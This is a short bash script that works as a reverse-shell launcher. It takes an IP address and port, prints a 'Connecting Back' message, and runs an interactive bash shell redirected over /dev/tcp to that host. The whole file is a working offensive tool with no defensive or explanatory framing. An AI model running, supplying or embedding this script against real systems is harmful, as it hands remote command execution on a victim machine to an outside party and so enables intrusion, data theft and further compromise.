#!/bin/bash 
if [[ $# -lt 2 ]] ; then
	echo 'Usage: '$0' [ip] [port]'
	exit;
fi
echo '[-] Connecting Back to '$1':'$2
bash -i >& /dev/tcp/$1/$2 0>&1
#EOF